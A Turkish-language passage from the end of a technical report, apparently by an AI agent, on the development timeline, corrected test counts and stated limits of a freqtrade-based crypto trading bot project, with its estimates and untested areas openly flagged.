- **Zaman tahmini (kendi değerlendirmem, ölçüm değil):** altyapı + veri + parça testleri ≈ 1 gün; strateji/risk iskeleti + terfi kapısı + sicil entegrasyonu ≈ 1–2 hafta; testli LLM veto + öğrenme döngüsü ≈ birkaç hafta; anlamlı bir istatistiksel kanıt ≈ aylar–yıllar (kaçınılmaz, hesaplanan).

Net: **"hazır parçalardan birkaç günde bot" mümkün, "öğrendiği kanıtlanmış bot" değil.** Birkaç gün: freqtrade + dry-run + A3/A1/G-serisi iskeleti. Haftalar: LLM katmanı ve ders-yönetimi (yeniden yazım gerekiyor). Aylar: istatistiksel doğrulama.

### 4.5 Önceki raporlar için düzeltmeler
- gorev4: `test_gate.py` 70 test (yazılan ~50), `test_guarded_strategy.py` 63 (yazılan ~25), `test_walkforward_null_registry.py` 12 (yazılan 10). Kapsam ve "regime-trading-bot'ta `grok_agent`/`strategy_state` testsiz" iddiası ölçümle doğrulandı. `static_check` boşluğu ve `beats_incumbent(None)` fail-open çalıştırılarak doğrulandı.
- gorev5: sayısal rakamları (MinTRL, PSR, E[max], DSR örneği) bağımsız bir uygulamayla doğrulandı (§3.2).

## 5. Sınırlar
- Tek koşu ölçümleri; tekrar yok. Dry-run: bir 13 dakikalık (`SampleStrategy`) ve bir 5 dakikalık (`DryProbe`) pencere; RAM ölçülemedi.
- Veri yalnızca spot, 3 pair, 185 gün; vadeli (funding/mark/kaldıraç) hiç sınanmadı.
- FreqAI sonucu (1 işlem) hiçbir performans iddiası taşımaz.
- Testler hiçbir gerçek borsa/LLM çağrısı yapmadı; regime-trading-bot testleri `XAI_API_KEY=test-key` gibi sahte değerleri kendisi ayarlıyor (`tests/conftest.py`).
- cryptobot ve astra-quant-agent bu görevde çalıştırılmadı (talimat kapsamı dışı). Conductor testleri çalıştırılmadı.
- `DryProbe`/`BiasedTest` ve `ccxt_probe.py`/`ccxt_sync.py` benim yazdığım yalnızca test sondalarıdır (geçici klasörde); depoya eklenmedi.
